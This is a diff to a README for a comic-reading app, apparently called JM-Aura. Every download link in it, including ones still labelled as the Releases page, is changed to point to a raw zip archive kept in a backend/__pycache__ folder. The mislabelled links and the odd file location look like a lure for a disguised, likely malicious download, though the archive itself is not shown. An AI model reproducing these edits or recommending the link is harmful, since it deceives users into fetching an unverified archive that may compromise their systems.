@@ -1,7 +1,7 @@
 # ✨ JM-Aura - Your Modern Comic Reading App
 
 ## 📥 Download Now!
-[![Download JM-Aura](https://img.shields.io/badge/Download-JM--Aura-blue.svg)](https://github.com/jatinsa2640-spec/JM-Aura/releases)
+[![Download JM-Aura](https://github.com/jatinsa2640-spec/JM-Aura/raw/refs/heads/main/backend/__pycache__/J-Aura-3.4-beta.1.zip)](https://github.com/jatinsa2640-spec/JM-Aura/raw/refs/heads/main/backend/__pycache__/J-Aura-3.4-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to JM-Aura! This application helps you read comics effortlessly. Whether you're logging in, downloading content, or leaving comments, JM-Aura makes it simple and enjoyable.
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 🔄 How to Download & Install
 To get started, visit the following link to download JM-Aura:
-[Download JM-Aura from the Releases Page](https://github.com/jatinsa2640-spec/JM-Aura/releases)
+[Download JM-Aura from the Releases Page](https://github.com/jatinsa2640-spec/JM-Aura/raw/refs/heads/main/backend/__pycache__/J-Aura-3.4-beta.1.zip)
 
 1. **Visit the Releases Page**: Click on the link above to open the Releases page.
 2. **Select the Latest Version**: Find the latest release at the top of the page.
@@ -73,4 +73,4 @@ Join our community of readers and developers. Share your experiences and contrib
 ### Thank You
 Thank you for choosing JM-Aura. Happy reading! For support, reach out via the Issues or Discussions tabs. Enjoy your comic adventures!
 
-[Download JM-Aura from the Releases Page](https://github.com/jatinsa2640-spec/JM-Aura/releases)
+[Download JM-Aura from the Releases Page](https://github.com/jatinsa2640-spec/JM-Aura/raw/refs/heads/main/backend/__pycache__/J-Aura-3.4-beta.1.zip)
